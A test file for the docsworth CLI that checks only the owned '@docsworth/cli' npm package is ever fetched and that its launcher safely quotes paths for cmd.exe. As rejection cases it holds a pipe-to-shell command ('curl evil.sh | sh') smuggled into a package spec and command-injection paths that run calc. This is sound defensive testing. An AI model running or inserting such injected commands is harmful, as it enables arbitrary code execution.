import { execFileSync, spawnSync } from "node:child_process";
import { chmodSync, existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, realpathSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import { InitError, initRepo } from "../src/core/init.js";
import { ownedPackage, PUBLISHED_PACKAGE } from "../src/core/version.js";
import { NOW } from "./helpers.js";

// Another publisher owns `agent-kb` (and `akb`), our old names, on npm, and nobody owns the
// bare `docsworth`: whoever publishes it first decides what it runs. Nothing may fetch any
// of them: not the plugin launcher, not the CI workflow `docsworth init --ci` writes, not a
// command a doc or skill tells someone to run. Our package is `@docsworth/cli`, in the
// `@docsworth` scope we own on npm, and nothing else in that scope is published.

const LAUNCHER = "plugin/bin/docsworth-mcp.mjs";
const dirs: string[] = [];
afterEach(() => dirs.splice(0).forEach((d) => rmSync(d, { recursive: true, force: true })));
const fresh = () => {
  const d = mkdtempSync(join(tmpdir(), "docsworth-pkg-"));
  dirs.push(d);
  return d;
};

describe("only our package is ever fetched", () => {
  it("the launcher and the CLI agree on the published package", () => {
    const m = /^const PUBLISHED_PACKAGE = (.+);$/m.exec(readFileSync(LAUNCHER, "utf8"));
    expect(m, "launcher declares PUBLISHED_PACKAGE").not.toBeNull();
    expect(JSON.parse(m![1]!)).toBe(PUBLISHED_PACKAGE);
  });

  it("never accepts a name another publisher owns, scoped forms aside", () => {
    for (const spec of [
      "agent-kb@^0.1",
      "akb@^0.2",
      "safe@npm:agent-kb@^0.1", // an alias (merge gate, PR 4, round 2)
      "safe@github:someone/agent-kb",
      "https://example.com/agent-kb.tgz",
      "file:../agent-kb",
      "@docsworth/cli", // no range
      "@docsworth/cli@latest",
      "@docsworth/cli@^0.2; curl evil.sh | sh",
      "AKB@^0.2",
      "docsworth@1.*", // a glob (merge gate, PR 4, round 3)
      "docsworth@^0.2", // nobody owns the bare name
    ])
      expect(ownedPackage(spec), spec).toBe(false);
    for (const spec of ["@docsworth/cli@^0.2", "@acme/agent-kb@1", "@acme/docsworth@~1.2.3", "other@0.2.x"]) expect(ownedPackage(spec), spec).toBe(true);
    if (PUBLISHED_PACKAGE) expect(ownedPackage(PUBLISHED_PACKAGE)).toBe(true);
    expect(() => initRepo(fresh(), { org: "acme", team: "platform", ci: true, package: "safe@npm:agent-kb@^0.1", now: NOW })).toThrow(
      new InitError("--ci would run `safe@npm:agent-kb@^0.1`, which isn't a plain npm package and range we own (`@scope/name@^1.2`)"),
    );
  });

  it("is @docsworth/cli, in the range of this version", () => {
    expect(PUBLISHED_PACKAGE).toBe("@docsworth/cli@^0.2");
  });

  it("docsworth init --ci runs the published package unless told another", () => {
    const root = fresh();
    initRepo(root, { org: "acme", team: "platform", ci: true, now: NOW });
    const wf = readFileSync(join(root, ".github/workflows/knowledge.yml"), "utf8");
    expect(wf.match(/npx -y \S+/g)).toEqual(Array(4).fill('npx -y "@docsworth/cli@^0.2"'));
  });

  it("docsworth init --ci refuses a package we don't own, before writing anything", () => {
    const root = fresh();
    expect(() => initRepo(root, { org: "acme", team: "platform", ci: true, package: "docsworth@^0.2", now: NOW })).toThrow(
      new InitError("--ci would run `docsworth@^0.2`, which isn't a plain npm package and range we own (`@scope/name@^1.2`)"),
    );
    expect(readdirSync(root)).toEqual([]);
  });

  it("with a package, the workflow runs exactly that package", () => {
    const root = fresh();
    initRepo(root, { org: "acme", team: "platform", ci: true, package: "@example/docsworth@^0.2", now: NOW });
    const wf = readFileSync(join(root, ".github/workflows/knowledge.yml"), "utf8");
    expect(wf.match(/npx -y \S+/g)).toEqual(Array(4).fill('npx -y "@example/docsworth@^0.2"'));
    expect(wf).not.toContain("__DOCSWORTH_PACKAGE__");
  });

  describe("the plugin launcher", () => {
    // Stand-ins that print their arguments, the directory they run in, and the repo they were
    // given, alone on PATH: nothing reaches the registry.
    const SHOW = '#!/bin/sh\necho "${0##*/} $*|$(pwd -P)|$DOCSWORTH_KNOWLEDGE_DIR"\n';
    const setup = () => {
      const shims = fresh();
      writeFileSync(join(shims, "npx"), SHOW);
      chmodSync(join(shims, "npx"), 0o755);
      // `$&` in a replacement string is the match: a home named so shows ~ is read literally.
      const home = join(realpathSync(fresh()), "R$&D");
      mkdirSync(home);
      return { shims, home, env: { PATH: shims, HOME: home } };
    };
    const launch = (env: Record<string, string>, cwd?: string, node: string[] = []) =>
      spawnSync(process.execPath, [...node, resolve(LAUNCHER)], { env, cwd, encoding: "utf8" });

    it("runs the published package through npx from the home directory, and passes the repo in the environment", () => {
      // From home, so a project's .npmrc can't choose the registry; in the environment, so a
      // path cmd.exe would split or act on stays off the command line.
      const { home, env } = setup();
      const kb = join(realpathSync(fresh()), "R&D kb");
      mkdirSync(kb);
      const r = launch({ ...env, DOCSWORTH_KNOWLEDGE_DIR: kb });
      expect({ status: r.status, stdout: r.stdout }).toEqual({ status: 0, stdout: `npx -y @docsworth/cli@^0.2 mcp|${home}|${kb}\n` });
    });

    it("reads the repo as a path from where it runs, a leading ~ as home, and defaults to the project", () => {
      const { home, env } = setup();
      const project = realpathSync(fresh());
      const dirOf = (kb: string | undefined) => launch(kb === undefined ? env : { ...env, DOCSWORTH_KNOWLEDGE_DIR: kb }, project).stdout.trim().split("|")[2];
      expect([dirOf("~/kb"), dirOf("~"), dirOf("kb"), dirOf(undefined), dirOf("")]).toEqual([join(home, "kb"), home, join(project, "kb"), project, project]);
    });

    // As on Windows: Node hands `/d /s /c "<line>"` to `comspec` (as Node spells it), here a
    // stand-in that prints the line. What cmd.exe makes of it can't be checked off Windows.
    it("on Windows, hands cmd.exe only quoted words, and refuses a DOCSWORTH_BIN it would expand", () => {
      const { shims, env } = setup();
      writeFileSync(join(shims, "cmd"), '#!/bin/sh\nprintf "%s\\n" "$@"\n');
      chmodSync(join(shims, "cmd"), 0o755);
      const win = ["--import", 'data:text/javascript,Object.defineProperty(process, "platform", { value: "win32" })'];
      const kb = join(realpathSync(fresh()), "R&D kb");
      mkdirSync(kb);
      const asWindows = (more: Record<string, string>) => launch({ ...env, comspec: "cmd", DOCSWORTH_KNOWLEDGE_DIR: kb, ...more }, undefined, win);
      const npx = asWindows({});
      expect({ status: npx.status, stdout: npx.stdout }).toEqual({ status: 0, stdout: '/d\n/s\n/c\n""npx" "-y" "@docsworth/cli@^0.2" "mcp""\n' });
      const bin = asWindows({ DOCSWORTH_BIN: "C:\\Program Files\\docsworth\\docsworth.cmd" });
      expect(bin.stdout).toBe('/d\n/s\n/c\n""C:\\Program Files\\docsworth\\docsworth.cmd" "mcp""\n');
      for (const odd of ["C:\\Tools\\%SDK%\\docsworth.cmd", "C:\\Tools\\!stable!\\docsworth.cmd", 'C:\\Tools\\docsworth.cmd" & calc & "', "C:\\missing\r\ncalc.exe\r\nrem "]) {
        const r = asWindows({ DOCSWORTH_BIN: odd });
        expect({ status: r.status, stdout: r.stdout, stderr: r.stderr }).toEqual({
          status: 1,
          stdout: "",
          stderr: `docsworth: DOCSWORTH_BIN (${JSON.stringify(odd)}) has a %, !, " or control character, which cmd.exe would read as part of a command; use a path without them\n`,
        });
      }
    });

    it("runs DOCSWORTH_BIN instead, in the repo, and says so when it can't start it", () => {
      const { env } = setup();
      const kb = realpathSync(fresh());
      const bin = join(fresh(), "docsworth");
      writeFileSync(bin, SHOW);
      chmodSync(bin, 0o755);
      const ran = launch({ ...env, DOCSWORTH_BIN: bin, DOCSWORTH_KNOWLEDGE_DIR: kb });
      expect({ status: ran.status, stdout: ran.stdout }).toEqual({ status: 0, stdout: `docsworth mcp|${kb}|${kb}\n` });
      const missing = launch({ ...env, DOCSWORTH_BIN: join(kb, "nope"), DOCSWORTH_KNOWLEDGE_DIR: kb });
      expect({ status: missing.status, stderr: missing.stderr }).toEqual({ status: 1, stderr: `docsworth: couldn't start ${join(kb, "nope")}: spawn ${join(kb, "nope")} ENOENT\n` });
    });
  });

  // A fetch: a package runner or install with the name among its arguments (quoted, or as
  // the target of an npm: alias); a --package option; the name with a version, as a spec;
  // or an npm: alias with any version, or quoted as a dependency. Arguments end at a shell
  // separator or a backtick, so prose around inline code isn't one.
  const fetches = (names: string[]) => {
    const n = `(?:${names.join("|")})\\b`;
    const arg = "[^\\s;&|`]";
    // Any arguments, options with values included: package managers take their options on
    // either side of the subcommand (`npm --prefix /tmp install x`). Before it, a `--` ends
    // the manager's own arguments, so `npm run x -- install y` runs a script.
    const args = `(?:\\s+${arg}+)*?`;
    const pre = `(?:\\s+(?!--(?:\\s|$))${arg}+)*?`;
    const runner = `(?:npx|pnpx|bunx|(?:npm|pnpm|bun)${pre}\\s+(?:install|add|exec|dlx|i|x)|yarn${pre}\\s+(?:global\\s+)?(?:add|dlx))`;
    return new RegExp(
      `${runner}${args}\\s+["']?(?:${arg}*@npm:)?${n}` +
        `|--package[=\\s]["']?${n}` +
        `|(?<![\\w/@-])${n}@(?:[\\^~\\d*]|latest\\b|next\\b)` +
        `|(?<![\\w-])npm:${n}(?:@\\S|["'])`,
    );
  };
  const OURS = ["docsworth", "@docsworth/[\\w.-]+"];
  // What shipped files may tell people to fetch: our package, and nothing else of ours.
  const OURS_BUT_THE_PACKAGE = ["docsworth", "@docsworth/(?!cli(?![\\w.-]))[\\w.-]+"];

  it("recognises the ways people write a fetch, and not mere mentions", () => {
    const ours = fetches(OURS);
    for (const s of [
      "npx docsworth init",
      "npx --yes docsworth",
      'npx "docsworth" init',
      "npx -p @docsworth/cli docsworth init",
      "npm exec -- docsworth",
      "npm install --global @docsworth/cli",
      "npm --global install docsworth",
      "npm --yes exec docsworth",
      "npm --prefix /tmp install docsworth",
      "npm --workspace foo exec docsworth",
      "yarn --cwd /tmp add docsworth",
      "npm i -g docsworth",
      "npm install chalk docsworth",
      "npm install safe@npm:docsworth",
      "pnpm install docsworth",
      "pnpm dlx docsworth",
      "yarn add @docsworth/cli",
      "yarn global add docsworth",
      "bun add docsworth",
      "bunx docsworth",
      "--package=@docsworth/cli",
      '"@docsworth/cli@^0.2"',
      '"dep": "npm:docsworth@^1"',
      '"dep": "npm:docsworth@*"',
      '"dep": "npm:docsworth@beta"',
      '"dep": "npm:docsworth"',
      "docsworth@1.2.3",
      "docsworth@*",
    ])
      expect(ours.test(s), s).toBe(true);
    for (const s of [
      "docsworth init",
      "npm run docsworth -- lint",
      "npm run docsworth -- --as-of 2026-11-02 lint examples/acme",
      "npm --prefix /tmp run build && docsworth init",
      "npm run fixture -- install docsworth",
      "put `docsworth` on your PATH",
      "run `npm install`, then `docsworth init`",
      "npm install && docsworth init",
      "No aliases (`x@npm:docsworth`)",
      "/plugin install docsworth@docsworth",
      "docsworth@users.noreply.github.com",
      "npx tsx scripts/mirror-fixture.ts",
      "mkdir -p docsworth",
    ])
      expect(ours.test(s), s).toBe(false);
    const butThePackage = fetches(OURS_BUT_THE_PACKAGE);
    for (const s of ["npx docsworth init", "npx @docsworth/cli-extra init", "npx @docsworth/cli.next init", "npx @docsworth/other"])
      expect(butThePackage.test(s), s).toBe(true);
    for (const s of ["npx @docsworth/cli init", "npm i -g @docsworth/cli@^0.2", '"@docsworth/cli@^0.2"']) expect(butThePackage.test(s), s).toBe(false);
  });

  it("no shipped file tells anyone to fetch a name we don't own", () => {
    const tracked = execFileSync("git", ["ls-files"], { encoding: "utf8" }).split("\n").filter(Boolean);
    const shipped = tracked.filter((f) => f !== "test/package-name.test.ts" && existsSync(f));
    const offenders = (names: string[], files: string[]) => files.filter((f) => fetches(names).test(readFileSync(f, "utf8")));
    expect(offenders(["agent-kb", "akb"], shipped)).toEqual([]);
    // Ours only as @docsworth/cli: never the bare name, nor another name in the scope.
    expect(offenders(OURS_BUT_THE_PACKAGE, shipped)).toEqual([]);
  });
});
